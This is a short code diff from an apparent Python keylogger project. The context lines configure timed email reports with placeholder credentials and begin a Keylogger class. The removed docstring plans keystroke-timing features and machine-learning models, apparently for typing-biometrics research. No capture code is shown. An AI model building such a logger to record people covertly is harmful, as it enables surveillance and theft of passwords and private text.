@@ -10,20 +10,6 @@ SEND_REPORT_EVERY = 30 # in seconds, 60 means 1 minute and so on
 EMAIL_ADDRESS = "thisisafakegmail@gmail.com"
 EMAIL_PASSWORD = "thisisafakepassword"
 
-"""
-    Data-Processing:
-    1) ✅ Remove uneccessary "press" logs when button is held (use hashmap)
-    2) ✅ Map press events to release events (use stack)
-    3) ✅ Format to : Keyname | Time-pressed | Time released | User (use pandas dataframe)
-    4) Aggregate the format : Average hold time, press-press time, release-press time, APM (actions per minute)
-
-    Algo:
-    1) EDA
-    2) KNN
-    3) Gradient booster (XGB / LGBM)
-
-"""
-
 class Keylogger:
     def __init__(self, interval, report_method="email"):
         # we gonna pass SEND_REPORT_EVERY to interval
